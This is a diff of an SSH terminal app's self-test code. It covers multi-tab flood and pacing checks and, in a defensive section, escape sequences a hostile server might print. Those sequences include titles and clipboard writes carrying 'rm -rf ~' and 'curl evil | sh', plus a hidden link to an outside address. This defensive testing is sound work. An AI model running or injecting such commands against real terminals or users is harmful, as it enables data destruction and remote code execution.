@@ -2,14 +2,15 @@
 // and only in an unpackaged build started with SSHAPP_SELFTEST=1. It prints one line, "SELFTEST <json>",
 // and exits with 0 only if every probe held. The lab (Playwright, real SSH servers, the fault proxy)
 // grows out of this; these probes stay as its first cases.
-import { app, clipboard, type BaseWindow, type Session, type WebContentsView } from 'electron';
+import { app, clipboard, nativeImage, type BaseWindow, type Session, type WebContentsView } from 'electron';
 import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process';
 import { createPublicKey, randomBytes, verify } from 'node:crypto';
 import { createServer } from 'node:http';
 import type { AddressInfo } from 'node:net';
+import { availableParallelism } from 'node:os';
 import { readdir, readFile, stat } from 'node:fs/promises';
 import path from 'node:path';
-import type { ShellState } from '../common/ipc';
+import { COPY_MAX, type ShellState } from '../common/ipc';
 import type { Boxes } from './boxes';
 import type { SignAnswer, SignRequest } from './engine';
 import type { Gate } from './gate';
@@ -17,6 +18,7 @@ import type { KeyProc } from './keyproc';
 import type { Tab } from './main';
 import { memory } from './memory';
 import { BUDGET, type Meter } from './meter';
+import { shareFor, type Pace } from './pace';
 import { takePicture } from './picture';
 
 interface Ctx {
@@ -44,6 +46,9 @@ interface Ctx {
   dropped(): number;
   droppedOn(): Record<string, number>;
   lateFromClosed(): number;
+  missing(): Record<string, number>;
+  pace: Pace;
+  forcePace(share: number | null): void;
 }
 
 interface Result {
@@ -119,7 +124,16 @@ async function until(what: () => boolean | Promise<boolean>, ms: number): Promis
 }
 
 const js = <T>(view: WebContentsView, code: string) => view.webContents.executeJavaScript(code, true) as Promise<T>;
-const shown = (t: Tab) => js<string>(t.view, `document.getElementById('out').textContent`);
+const shown = (t: Tab) => js<string>(t.view, `window.berthTerm.text()`);
+// Is the tab's page whole: every stylesheet it names loaded with rules in it, the terminal's typeface loaded, and
+// the library's own hidden text field hidden (it shows when the library's stylesheet is missing).
+interface Dress { sheets: number[]; face: boolean; field: string; }
+const dress = (t: Tab) => js<Dress>(t.view, `document.fonts.ready.then(() => ({
+  sheets: [...document.querySelectorAll('link[rel=stylesheet]')].map((l) => { try { return l.sheet ? l.sheet.cssRules.length : -1; } catch { return -2; } }),
+  face: [...document.fonts].some((f) => f.family.replace(/['"]/g, '') === 'Plex Mono' && f.status === 'loaded'),
+  field: (() => { const f = document.querySelector('.xterm-helper-textarea'); return f ? getComputedStyle(f).opacity + ' ' + getComputedStyle(f).position : 'none'; })(),
+}))`);
+const dressed = (d: Dress) => d.sheets.length >= 3 && d.sheets.every((n) => n > 0) && d.face && d.field === '0 absolute';
 const type = (t: Tab, text: string) => js<void>(t.view, `window.tabPort.send(new TextEncoder().encode(${JSON.stringify(text)}))`);
 // Signals go to one real process only. A pid of 0 would mean "every process in our group", main included:
 // an engine that never started has no pid, and must never be signalled.
@@ -149,7 +163,11 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
     stage = `after "${name}"`;
     results.push({ name, ok, detail: typeof detail === 'string' ? detail : JSON.stringify(detail) });
   };
-  const finish = (code: number) => {
+  const finish = (asked: number) => {
+    // Every mode ends here, so every mode is held to this: a page that asked for a file the app does not hold
+    // was running without a part of itself.
+    check('no page of the app asked for a file the app does not hold', Object.keys(ctx.missing()).length === 0, ctx.missing());
+    const code = asked === 0 && results.every((r) => r.ok) ? 0 : 1;
     process.stdout.write(`SELFTEST ${JSON.stringify({ ok: code === 0, kind: ctx.kind, results })}\n`);
     app.exit(code);
   };
@@ -329,6 +347,14 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         const front = [...ctx.tabs.values()].find((t) => t.id === ctx.shellState().active);
         const made = await takePicture({ win: ctx.win, views: front ? [front.view, ctx.shell] : [ctx.shell], file: path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`), strip: `Berth, the app as built   |   dark   |   window ${size.width}x${size.height}   |   ${what}   |   commit ${commit}`, dist: ctx.dist, harden: ctx.harden });
         check(`a picture: ${what}`, made.width > 0, made);
+        if (name === 'tab-open') {
+          // The picture is the window: in its middle is the tab's terminal, seen through the shell that lies
+          // over it. (Until 2026-11-16 the pictures showed black there, and nothing noticed.)
+          const png = nativeImage.createFromBuffer(await readFile(path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`)));
+          const at = (Math.floor(png.getSize().height / 2) * png.getSize().width + Math.floor(png.getSize().width / 2)) * 4;
+          const px = [...png.toBitmap().subarray(at, at + 3)].reverse().map((v) => v.toString(16).padStart(2, '0')).join('');
+          check('the picture shows the tab through the shell: its middle is the terminal\'s own colour', px === '141b21', px);
+        }
       };
       const shellOnTop = () => {
         const kids = ctx.win.contentView.children;
@@ -422,6 +448,12 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         const t2ok = await until(() => [...ctx.tabs.values()].some((t) => t.place === 'logs' && t.engine.link.phase === 'up'), 20_000);
         check('a place opens a tab there, signed in; the menu is gone and the tab is above the shell', t2ok && !(await has('#box-menu')) && !shellOnTop(), [...ctx.tabs.values()].map((t) => t.engine.link.phase));
         check('the tab says its box and its place, in the box\'s colour', (await text('[data-tab]')).includes('lab-box') && (await text('[data-tab]')).includes('logs') && (await text('#status')).includes('lab-box, logs'), await text('#status'));
+        {
+          const front = [...ctx.tabs.values()].find((t) => t.place === 'logs')!;
+          const worn = await dress(front);
+          check('the tab\'s page is whole: stylesheets, typeface, the terminal\'s own text field out of sight', dressed(worn), worn);
+          await js<void>(front.view, `new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => r())))`);
+        }
         await shot('tab-open', 'a tab open on a box');
 
         // Seven tabs on one box in a 1024-wide window: the box's tabs fold into one, and the count opens them.
@@ -552,11 +584,41 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       return;
     }
 
-    // "seven": the fullest day. Seven tabs, each with its own view and engine, all answering, none leaking into
-    // another; with what it costs in memory.
+    // "seven": the fullest day. Seven tabs on a box, each with its own view, engine and SSH link, all answering,
+    // none leaking into another; flooded all at once while the window is used; with what it costs in memory.
+    // The box is the lab's own SSH server: its sessions print as fast as each link takes it, so every byte is
+    // encrypted, carried, held to the fixed amount a box may be ahead, and drawn by a real terminal.
     if (ctx.mode === 'seven') {
-      const all = Array.from({ length: 7 }, () => ctx.openTab()!);
-      check('seven engines answer', await until(() => all.every((t) => t.engine.state === 'ready'), 30_000), all.map((t) => t.engine.state));
+      const labBin = process.env['SSHAPP_LABBOX'] ?? '';
+      if (labBin === '') {
+        check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set: the seven tabs need the lab\'s SSH server');
+        canary.close();
+        clearTimeout(guard);
+        return finish(1);
+      }
+      // Three boxes: four tabs on one, two on another, one on the last, as a full day has it.
+      const labs: LabBox[] = [];
+      const boxIds: string[] = [];
+      for (const [n, name] of ['lab-box', 'lab-two', 'lab-three'].entries()) {
+        const { box: lab, first } = await LabBox.start(labBin);
+        const added = await ctx.boxes.add({ name, colour: n + 2, host: '127.0.0.1', port: String(first['addr'] ?? '').split(':')[1] ?? '', user: 'demo', folder: '', places: [] });
+        const boxId = added.ok ? added.id : '';
+        ctx.boxes.reach(boxId);
+        await until(() => ctx.boxes.check(boxId).step === 'reached', 20_000);
+        ctx.boxes.paste(boxId, String(first['printed'] ?? ''));
+        const trusted = await ctx.boxes.trust(boxId);
+        await lab.tell(`accept ${ctx.boxes.get(boxId)?.publicKey ?? ''}`);
+        check(`${name} is added, checked and pinned`, added.ok && trusted.ok, [added, trusted]);
+        labs.push(lab);
+        boxIds.push(boxId);
+      }
+      const everyLab = async (line: string, key: string): Promise<number> => {
+        let sum = 0;
+        for (const lab of labs) sum += Number((await lab.tell(line))[key] ?? 0);
+        return sum;
+      };
+      const all = [0, 0, 0, 0, 1, 1, 2].map((n) => ctx.openTab(boxIds[n])!);
+      check('seven links are up, each signed in', await until(() => all.every((t) => t.engine.link.phase === 'up'), 30_000), all.map((t) => t.engine.link.phase));
       for (const t of all) await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
       const ids = [process.pid, ctx.shell.webContents.getOSProcessId(), ...all.map((t) => t.view.webContents.getOSProcessId()), ...all.map((t) => t.engine.pid)];
       check('sixteen processes, each its own', new Set(ids).size === 16 && !ids.includes(0), ids);
@@ -569,47 +631,109 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         if (text) arrived++;
         if (all.some((_, j) => j !== i && text.includes(`seven-${j}-x`))) leaks++;
       }
-      check('each of the seven hears its own engine only', arrived === 7 && leaks === 0, { arrived, leaks });
+      check('each of the seven hears its own link only', arrived === 7 && leaks === 0, { arrived, leaks });
       // Every tab, and the button that opens one more, is in sight, whatever the window's width. A tab that has
       // slid out of the bar cannot be pressed, and what cannot be seen is not there (found 2026-11-16 on a
       // 1024-wide screen: tabs six and seven were past the window's edge).
-      const inBar = await js<{ width: number; out: string[] }>(ctx.shell, `(() => { const w = window.innerWidth; const out = []; for (const el of document.querySelectorAll('[data-tab], #new')) { const r = el.getBoundingClientRect(); if (r.width < 1 || r.left < 0 || r.right > w + 0.5) out.push((el.getAttribute('data-tab') ? 'tab ' + el.getAttribute('data-tab') : 'the new-tab button') + ' ' + Math.round(r.left) + '..' + Math.round(r.right)); } return { width: w, out }; })()`);
-      check(`all seven tabs and the new-tab button are inside a bar ${inBar.width} wide`, inBar.out.length === 0, inBar);
-      // The promises, measured under load: every tab floods its engine for four seconds while real clicks switch
-      // tabs and real keys are typed. Budgets are the plan's (B8), times the stated factor for slow test machines.
+      const inBar = await js<{ width: number; out: string[] }>(ctx.shell, `(() => { const w = window.innerWidth; const out = []; for (const el of document.querySelectorAll('[data-tab], [data-fold], #new')) { const r = el.getBoundingClientRect(); if (r.width < 1 || r.left < 0 || r.right > w + 0.5) out.push((el.getAttribute('data-tab') || el.id || 'fold') + ' ' + Math.round(r.left) + '-' + Math.round(r.right)); } return { width: w, out }; })()`);
+      check(`every tab and the new-tab button are inside a bar ${inBar.width} wide`, inBar.out.length === 0, inBar);
+
+      // The promises, measured under load: for four seconds every session on the box prints as fast as its link
+      // takes it, while tabs are brought to the front one after another and real keys are typed into each.
+      // Budgets are the plan's (B8), times the stated factor for slow test machines.
       const factor = Math.max(1, Number(process.env['SSHAPP_BUDGET_FACTOR']) || 1);
+      const paceOf = (t: Tab) => js<{ front: boolean; share: number; rested: number; taken: number; waiting: number }>(t.view, `window.berthTerm.pace()`);
+      const takenAll = async () => {
+        let sum = 0;
+        for (const t of all) sum += (await paceOf(t)).taken;
+        return sum;
+      };
+      const bringToFront = async (t: Tab) => {
+        await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
+        return until(() => ctx.shellState().active === t.id, 1000);
+      };
+      const pressAndType = async (t: Tab): Promise<boolean> => {
+        // A box with several tabs in a narrow window folds them into one tab with a count: then the tab is
+        // chosen the way the count's list chooses it. Otherwise by a real press on the tab itself.
+        const at = await js<{ x: number; y: number } | null>(ctx.shell, `(() => { const b = document.querySelector('[data-tab="${t.id}"]'); if (!b) return null; const r = b.getBoundingClientRect(); return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) }; })()`);
+        if (at && ctx.shellState().active !== t.id) {
+          ctx.shell.webContents.sendInputEvent({ type: 'mouseDown', x: at.x, y: at.y, button: 'left', clickCount: 1 });
+          ctx.shell.webContents.sendInputEvent({ type: 'mouseUp', x: at.x, y: at.y, button: 'left', clickCount: 1 });
+        } else if (!at) await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
+        // The key follows the press at once, as a hand does, before the tab has been painted.
+        t.view.webContents.focus();
+        for (const type of ['keyDown', 'char', 'keyUp'] as const) t.view.webContents.sendInputEvent({ type, keyCode: 'k' });
+        // A press counts only if the tab really came to the front: a press that landed nowhere measures nothing.
+        return until(() => ctx.shellState().active === t.id, 1000);
+      };
+      const slowestSaid = (): string => {
+        const slow = ctx.meter.slowest;
+        return slow ? `${slow.kind} in ${slow.view === 0 ? 'the bar' : `tab ${slow.view}`}, ${slow.waitMs} ms before its handlers, ${slow.handlerMs} ms inside them, ${slow.paintMs} ms to the painted frame` : 'none over 16 ms';
+      };
       await sleep(1200); // let start-up noise be reported, then begin clean
+
+      // First with nothing printing: tabs brought to the front one after another, a key typed into each.
+      ctx.meter.reset();
+      let calmOk = 0;
+      for (let i = 0; i < 12; i++) {
+        const began = Date.now();
+        if (await pressAndType(all[i % all.length]!)) calmOk++;
+        await sleep(Math.max(0, 200 - (Date.now() - began)));
+      }
+      await sleep(1200); // the views report twice a second
+      const calm = { ...ctx.meter.worst };
+      check(`with nothing printing: a click or key was painted within ${calm.reactionMs} ms and a tab switch within ${calm.tabSwitchMs} ms (budget ${BUDGET.reactionMs} ms${factor > 1 ? `, times ${factor} on this machine` : ''}; slowest: ${slowestSaid()})`, calmOk === 12 && calm.reactionMs <= BUDGET.reactionMs * factor && calm.tabSwitchMs <= BUDGET.tabSwitchMs * factor && calm.tabSwitchMs > 0, { calmOk, calm });
+
+      // Then one tab in front whose box prints as fast as the link takes it (a "yes", a huge file to the
+      // screen), with keys typed into it all the while.
+      const alone = all[6]!;
+      await bringToFront(alone);
+      await sleep(300);
+      ctx.meter.reset();
+      const aloneBefore = Number((await labs[2]!.tell('flooded'))['bytes'] ?? 0);
+      await labs[2]!.tell('flood 3000');
+      for (const until3 = Date.now() + 3000; Date.now() < until3; ) {
+        for (const type of ['keyDown', 'char', 'keyUp'] as const) alone.view.webContents.sendInputEvent({ type, keyCode: 'k' });
+        await sleep(150);
+      }
+      await until(() => alone.engine.waiting() === 0, 20_000);
+      await sleep(1200);
+      const flat = { ...ctx.meter.worst };
+      const aloneRate = ((Number((await labs[2]!.tell('flooded'))['bytes'] ?? 0) - aloneBefore) / 1048576 / 3).toFixed(1);
+      check(`one tab flooded as fast as its link takes it, ${aloneRate} MB/s: a key typed into it was painted within ${flat.reactionMs} ms (budget ${BUDGET.reactionMs} ms${factor > 1 ? `, times ${factor} on this machine` : ''}; slowest: ${slowestSaid()})`, Number(aloneRate) > 1 && flat.reactionMs > 0 && flat.reactionMs <= BUDGET.reactionMs * factor, flat);
+
+      // Last, all seven at once.
       ctx.meter.reset();
       const FLOOD_MS = 4000;
-      for (const t of all) {
-        await js(t.view, `(() => { const chunk = new Uint8Array(16384).fill(120); const end = Date.now() + ${FLOOD_MS}; window.__sent = 0; const go = () => { if (Date.now() > end) return; window.tabPort.send(chunk); window.__sent += chunk.length; setTimeout(go, 0); }; go(); })()`);
-      }
+      const PER_TAB = 2 * 1024 * 1024; // bytes a second each session prints: far more than a busy build's log
+      const takenBefore = await takenAll();
+      const floodedBefore = await everyLab('flooded', 'bytes');
+      const flooding = await everyLab(`flood ${FLOOD_MS} ${PER_TAB}`, 'flooding');
       const until4 = Date.now() + FLOOD_MS;
       let turn = 0;
       let presses = 0;
       let switches = 0;
       while (Date.now() < until4) {
-        const t = all[turn++ % all.length]!;
-        const at = await js<{ x: number; y: number } | null>(ctx.shell, `(() => { const b = document.querySelector('[data-tab="${t.id}"]'); if (!b) return null; const r = b.getBoundingClientRect(); return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) }; })()`);
-        if (at) {
-          ctx.shell.webContents.sendInputEvent({ type: 'mouseDown', x: at.x, y: at.y, button: 'left', clickCount: 1 });
-          ctx.shell.webContents.sendInputEvent({ type: 'mouseUp', x: at.x, y: at.y, button: 'left', clickCount: 1 });
-          presses++;
-        }
-        // The key follows the press at once, as a hand does, before the tab has been painted.
-        t.view.webContents.focus();
-        for (const type of ['keyDown', 'char', 'keyUp'] as const) t.view.webContents.sendInputEvent({ type, keyCode: 'k' });
-        // A press counts only if the tab really came to the front: a press that landed nowhere measures nothing.
         const began = Date.now();
-        if (at && (await until(() => ctx.shellState().active === t.id, 1000))) switches++;
+        presses++;
+        if (await pressAndType(all[turn++ % all.length]!)) switches++;
         await sleep(Math.max(0, 200 - (Date.now() - began)));
       }
+      const lowest = ctx.pace.lowest;
+      // The flood is over when the box has stopped and every tab has worked through what it was sent.
+      const drained = await until(async () => all.every((t) => t.engine.waiting() === 0) && (await Promise.all(all.map(paceOf))).every((p) => p.waiting === 0), 20_000);
       await sleep(1500); // the views report twice a second
-      let sent = 0;
-      for (const t of all) sent += await js<number>(t.view, `window.__sent || 0`);
+      const flooded = (await everyLab('flooded', 'bytes')) - floodedBefore;
+      const drawn = (await takenAll()) - takenBefore;
       const w = { ...ctx.meter.worst };
-      const mbps = (sent / 1048576 / (FLOOD_MS / 1000)).toFixed(1);
-      check(`under load: ${switches} of ${presses} presses on a tab brought it to the front, ${mbps} MB/s through seven engines`, presses >= 7 && switches === presses && turn === presses && sent > 0, { turn, presses, switches, sent });
+      const mbps = (flooded / 1048576 / (FLOOD_MS / 1000)).toFixed(1);
+      check(`under load: ${switches} of ${presses} presses brought their tab to the front, ${mbps} MB/s from the box through seven links and terminals`, flooding === 7 && presses >= 7 && switches === presses && flooded > 1048576, { turn, presses, switches, flooded, flooding });
+      // Nothing is lost on the way, held back or not: what the terminals worked through is what the box
+      // printed, and the few keys it sent back.
+      check('every byte the box printed was worked through by its terminal, and no more than the keys typed besides', drained && drawn >= flooded && drawn <= flooded + presses * 8, { drained, flooded, drawn, waiting: all.map((t) => t.engine.waiting()) });
+      const processors = availableParallelism();
+      const rests = (await Promise.all(all.map(paceOf))).map((p) => p.rested);
+      check(`the tab in front came first: with ${processors} processors, a flooded tab behind was allowed ${lowest === 1 ? 'all of its time' : `${Math.round(lowest * 100)} % of its time at the least`} (the rule allows ${Math.round(shareFor(processors, 6) * 100)} % with six flooded behind)`, lowest >= shareFor(processors, 6) && (lowest < 1 || rests.every((n) => n === 0)), { lowest, rests });
       const within = (key: keyof typeof BUDGET, what: string, mustMeasure: boolean) => {
         const limit = BUDGET[key] * factor;
         check(`${what}: ${w[key]} ms (budget ${BUDGET[key]} ms${factor > 1 ? `, times ${factor} on this machine` : ''})`, w[key] <= limit && (!mustMeasure || w[key] > 0), w);
@@ -617,12 +741,32 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       within('mainDelayMs', 'main was never later than', true);
       within('viewTaskMs', 'no view was busy in one stretch longer than', false);
       // The slowest one also says where its time went: a slow reaction is explained, never guessed at.
-      const slow = ctx.meter.slowest;
-      within('reactionMs', `a real click or key was painted within (slowest: ${slow ? `${slow.kind} in ${slow.view === 0 ? 'the bar' : `tab ${slow.view}`}, ${slow.waitMs} ms before its handlers, ${slow.handlerMs} ms inside them, ${slow.paintMs} ms to the painted frame` : 'none over 16 ms'})`, false);
+      within('reactionMs', `a real click or key was painted within (slowest: ${slowestSaid()})`, false);
       within('tabSwitchMs', 'a tab switch was painted within', true);
       within('startMs', 'from process start to the first painted frame', true);
 
+      // The rest itself, by hand: told a small share, a flooded tab behind works through far less than the tab
+      // in front, which never rests; told the whole of its time, no tab rests at all.
+      const frontTab = all[0]!;
+      await bringToFront(frontTab);
+      const behindTab = all[3]!;
+      const measure = async (share: number) => {
+        ctx.forcePace(share);
+        await sleep(200);
+        const before = [await paceOf(frontTab), await paceOf(behindTab)];
+        await everyLab('flood 1500', 'flooding');
+        await sleep(1500);
+        const after = [await paceOf(frontTab), await paceOf(behindTab)];
+        await until(async () => all.every((t) => t.engine.waiting() === 0), 20_000);
+        return { front: after[0]!.taken - before[0]!.taken, behind: after[1]!.taken - before[1]!.taken, frontRested: after[0]!.rested - before[0]!.rested, behindRested: after[1]!.rested - before[1]!.rested };
+      };
+      const small = await measure(0.05);
+      const whole = await measure(1);
+      ctx.forcePace(null);
+      check('told a small share, a flooded tab behind rests and works through far less than the tab in front, which never rests', small.behindRested > 0 && small.frontRested === 0 && small.behind * 3 < small.front, small);
+      check('told the whole of its time, no tab rests', whole.behindRested === 0 && whole.frontRested === 0 && whole.behind > 0, whole);
       const mem = await memory(all.map((t) => t.engine.pid));
+      for (const lab of labs) lab.end();
       const budget = 300 + 7 * 220;
       check(`memory with seven tabs: ${mem.fairMB} MB (${mem.how}); budget ${budget} MB; plain per-process sum ${mem.plainMB} MB`, mem.fairMB > 0 && mem.fairMB < budget, mem);
       canary.close();
@@ -645,7 +789,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       const sealed = await js<boolean>(v, `(window.tabPort ?? window.shellPort).sandboxed`);
       check(`${name}: sandboxed`, sealed === true, sealed);
       const port = await js<string>(v, `Object.keys(window.tabPort ?? window.shellPort).sort().join()`);
-      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gatePickBackup,gateUnlock,meter,onGate,onState,sandboxed' : 'frame,meter,onBanner,onOutput,onShown,onState,sandboxed,send,taken'), port);
+      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gatePickBackup,gateUnlock,meter,onGate,onState,sandboxed' : 'copy,frame,meter,onBanner,onOutput,onPace,onShown,onState,resize,sandboxed,send,taken'), port);
     }
     const pids = [process.pid, ...views.map(([, v]) => v.webContents.getOSProcessId()), a.engine.pid, b.engine.pid];
     check('every view and engine is its own process', new Set(pids).size === pids.length && !pids.includes(0), pids);
@@ -787,14 +931,141 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       check('what was agreed is the plan\'s', t.engine.link.cipher === 'aes256-gcm@openssh.com' && ['mlkem768x25519-sha256', 'curve25519-sha256'].includes(t.engine.link.keyExchange), t.engine.link);
       check('the tab says which box and place it is on', JSON.stringify(ctx.shellState().tabs.find((x) => x.id === t.id)?.box) === JSON.stringify({ id, name: 'lab-box', colour: 2, place: 'logs' }), ctx.shellState().tabs);
       await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
+      // The box's sign-in text holds a question, a clipboard write and a colour: it is drawn as words on its
+      // own lines, each control character as its picture, and the box's shell is given nothing because of it.
+      const PIC = (c: number) => String.fromCodePoint(0x2400 + c); // a control character's picture
+      await until(async () => (await shown(t)).includes('second line'), 5000);
+      await sleep(200);
+      const signInText = (await shown(t)).split('\n').slice(0, 2);
+      const becauseOfIt = Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
+      check('the box\'s sign-in text is drawn as words, line by line, its control characters as pictures; nothing in it is obeyed or answered', signInText[0] === 'Welcome to the lab box' && signInText[1] === `${PIC(0x1b)}[c${PIC(0x1b)}]52;c;aGlkZGVu${PIC(7)}${PIC(0x1b)}[31msecond line` && becauseOfIt === '', [signInText, JSON.stringify(becauseOfIt)]);
       await type(t, 'typed-into-the-box-5b2');
       check('typed bytes reach the box\'s shell and its output comes back to this tab', await until(async () => (await shown(t)).includes('typed-into-the-box-5b2'), 5000), await shown(t));
       check('another tab saw none of it', !(await shown(a)).includes('typed-into-the-box'), '');
       const seenNow = await lab.tell('seen');
       const sessions = (seenNow['sessions'] ?? []) as { Asked?: string[]; Command?: string; Term?: string; Cols?: number; Rows?: number }[];
       const last = sessions[sessions.length - 1];
-      check('the box was asked for a terminal and the place\'s one start command, and nothing else', sessions.length === 1 && JSON.stringify(last?.Asked) === '["pty-req","exec"]' && last?.Command === `cd -- '/var/log/it'\\''s here' && exec "$SHELL" -l` && last?.Term === 'xterm-256color' && last?.Cols === 120 && last?.Rows === 40, seenNow);
+      check('the box was asked for a terminal and the place\'s one start command, and nothing else', sessions.length === 1 && JSON.stringify(last?.Asked?.slice(0, 2)) === '["pty-req","exec"]' && (last?.Asked ?? []).slice(2).every((x) => x === 'window-change') && last?.Command === `cd -- '/var/log/it'\\''s here' && exec "$SHELL" -l` && last?.Term === 'xterm-256color', seenNow);
+      const sizeNow = await js<{ cols: number; rows: number }>(t.view, `window.berthTerm.size()`);
+      check(`the box's terminal was opened at this tab's own size, ${sizeNow.cols} x ${sizeNow.rows}, and never told a size twice`, last?.Cols === sizeNow.cols && last?.Rows === sizeNow.rows && sizeNow.cols > 40 && (last?.Asked ?? []).length === 2, [last?.Cols, last?.Rows, sizeNow, last?.Asked]);
+      const worn = await dress(t);
+      check('the tab\'s page is whole: each of its stylesheets loaded, the terminal\'s typeface too, the terminal\'s own text field out of sight', dressed(worn), worn);
       check('it signed in as the box\'s user', Array.isArray(seenNow['users']) && (seenNow['users'] as string[]).every((u) => u === 'demo'), seenNow['users']);
+
+      // ---- What a box may not do through the terminal (plan B3, B10). The box prints; the app must send back
+      // nothing but the written answers, and nothing of the PC may change. The box's shell is told to stay
+      // silent meanwhile, so that what it was given is exactly what the terminal sent by itself.
+      await lab.tell('quiet on');
+      await sleep(150);
+      await lab.tell('received');
+      const boxPrints = (text: string) => lab.tell(`print ${Buffer.from(text, 'latin1').toString('hex')}`);
+      const boxGot = async (): Promise<string> => {
+        await sleep(250);
+        return Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
+      };
+      const ESC = '\x1b';
+      const BEL = '\x07';
+      const ST = `${ESC}\\`;
+      const questions: [string, string, string][] = [
+        ['what kind of terminal', `${ESC}[c${ESC}[0c`, `${ESC}[?1;2c${ESC}[?1;2c`],
+        ['which terminal', `${ESC}[>c`, `${ESC}[>0;276;0c`],
+        ['are you there', `${ESC}[5n`, `${ESC}[0n`],
+        ['where is the cursor', `${ESC}[2J${ESC}[5;9H${ESC}[6n${ESC}[?6n`, `${ESC}[5;9R${ESC}[?5;9R`],
+        ['is this mode on', `${ESC}[?2004$p${ESC}[?2004h${ESC}[?2004$p${ESC}[?2004l${ESC}[?31337$p`, `${ESC}[?2004;2$y${ESC}[?2004;1$y${ESC}[?31337;0$y`],
+      ];
+      const wrongAnswers: string[] = [];
+      for (const [what, printed, want] of questions) {
+        await boxPrints(printed);
+        const back = await boxGot();
+        if (back !== want) wrongAnswers.push(`${what}: sent ${JSON.stringify(back)}, the list says ${JSON.stringify(want)}`);
+      }
+      check(`the terminal's ${questions.length} written answers are exactly what the list says`, wrongAnswers.length === 0, wrongAnswers);
+
+      clipboard.writeText('what-was-on-the-clipboard');
+      const titleBefore = ctx.win.getTitle();
+      const boundsBefore = JSON.stringify(ctx.win.getBounds());
+      const labelBefore = await text(`[data-tab="${t.id}"]`);
+      const refusedOnes: [string, string][] = [
+        ['a third kind of "which terminal"', `${ESC}[=c`],
+        ['the title set to a command, then asked back', `${ESC}]0;rm -rf ~${BEL}${ESC}]2;curl evil | sh${BEL}${ESC}[21t${ESC}[20t`],
+        ['the window asked about, moved and sized', `${ESC}[14t${ESC}[16t${ESC}[18t${ESC}[19t${ESC}[13t${ESC}[11t${ESC}[3;0;0t${ESC}[8;10;10t${ESC}[4;200;200t${ESC}[2t${ESC}[9;1t`],
+        ['"say back your settings"', `${ESC}P$qm${ST}${ESC}P$q"p${ST}${ESC}P$qr${ST}${ESC}P$q q${ST}`],
+        ['"say back your abilities" and "name yourself"', `${ESC}P+q544e${ST}${ESC}[>q${ESC}[>0q`],
+        ['colours asked for, and set', `${ESC}]10;?${BEL}${ESC}]11;?${BEL}${ESC}]12;?${BEL}${ESC}]4;1;?${BEL}${ESC}]11;#ff0000${BEL}${ESC}]4;1;#00ff00${BEL}${ESC}]104${BEL}${ESC}]110${BEL}`],
+        ['the clipboard written, and asked for', `${ESC}]52;c;${Buffer.from('curl evil | sh\n').toString('base64')}${BEL}${ESC}]52;c;?${BEL}${ESC}]52;p;?${BEL}`],
+        ['"who are you" (ENQ), and the other form of the mode question', `\x05${ESC}[4$p${ESC}[20$p`],
+        ['a link hidden behind other words', `${ESC}]8;;http://203.0.113.9/get${BEL}click here${ESC}]8;;${BEL}`],
+      ];
+      const leaked: string[] = [];
+      for (const [what, printed] of refusedOnes) {
+        await boxPrints(printed);
+        const back = await boxGot();
+        if (back !== '') leaked.push(`${what}: the terminal sent ${JSON.stringify(back)}`);
+      }
+      check(`${refusedOnes.length} kinds of question and command a box may not use get no answer at all`, leaked.length === 0, leaked);
+      // A program may ask to be told when the window gains or loses focus; it is then told at once whether it
+      // has it now. That report is fixed text. Asking for the mouse, or for protected paste, sends nothing by itself.
+      await boxPrints(`${ESC}[?1000h${ESC}[?1006h${ESC}[?2004h`);
+      const quietModes = await boxGot();
+      await boxPrints(`${ESC}[?1004h`);
+      const focusSaid = await boxGot();
+      check('asking for mouse reports sends nothing by itself; asking for focus reports is answered with the focus now, and nothing else', quietModes === '' && (focusSaid === `${ESC}[I` || focusSaid === `${ESC}[O` || focusSaid === ''), [JSON.stringify(quietModes), JSON.stringify(focusSaid)]);
+      check('and nothing of the PC changed: the clipboard, the window\'s title, size and place, the tab\'s label', (await clipboard.readText()) === 'what-was-on-the-clipboard' && ctx.win.getTitle() === titleBefore && JSON.stringify(ctx.win.getBounds()) === boundsBefore && (await text(`[data-tab="${t.id}"]`)) === labelBefore, [await clipboard.readText(), ctx.win.getTitle(), await text(`[data-tab="${t.id}"]`)]);
+      // The words that came with a hidden link: the pointer is moved onto them. Over a link it would turn
+      // into a hand; over plain words it does not.
+      const words = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
+      if (words) t.view.webContents.sendInputEvent({ type: 'mouseMove', x: words.x, y: words.y });
+      await sleep(400);
+      const over = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
+      const drawn = await js<{ links: number; shown: boolean; faults: string[] }>(t.view, `({ links: document.querySelectorAll('#term a').length, shown: window.berthTerm.text().includes('click here'), faults: window.berthTerm.policyFaults() })`);
+      check('the hidden link is plain words with nothing behind them, also under the pointer; the page\'s own policy was never broken', drawn.links === 0 && drawn.shown && drawn.faults.length === 0 && over !== null && !over.hand, [drawn, over]);
+      await boxPrints(`${ESC}[?1004l${ESC}[?1000l${ESC}[?1006l${ESC}[?2004l${ESC}[2J${ESC}[H`);
+
+      // Paste is not the terminal's: with text on the clipboard, no paste key and no drop puts it on the box.
+      clipboard.writeText('echo this-came-from-the-clipboard');
+      t.view.webContents.focus();
